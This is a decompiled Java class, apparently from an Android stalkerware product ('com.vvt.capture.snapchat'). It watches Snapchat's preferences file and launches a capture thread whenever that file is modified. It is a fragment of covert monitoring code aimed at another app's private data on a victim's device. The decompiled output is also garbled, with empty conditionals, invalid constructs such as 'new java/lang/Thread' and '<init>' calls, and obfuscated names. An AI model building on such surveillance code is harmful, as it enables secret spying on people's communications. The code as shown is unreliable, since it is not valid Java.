package com.vvt.capture.snapchat.a;

import android.os.FileObserver;
import java.io.File;

class d
  extends FileObserver
{
  private String b;
  private Thread c;
  private File d;
  
  public d(a parama, String paramString)
  {
    super(paramString, 2);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    boolean bool1 = a.d();
    if (bool1) {}
    int i = 2;
    if (paramInt == i)
    {
      Object localObject = "com.snapchat.android_preferences.xml";
      boolean bool2 = paramString.equals(localObject);
      if (bool2)
      {
        localObject = this.c;
        if (localObject == null)
        {
          bool2 = a.a();
          if (bool2) {}
          localObject = new java/lang/Thread;
          e locale = new com/vvt/capture/snapchat/a/e;
          locale.<init>(this);
          ((Thread)localObject).<init>(locale);
          this.c = ((Thread)localObject);
          localObject = this.c;
          ((Thread)localObject).start();
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */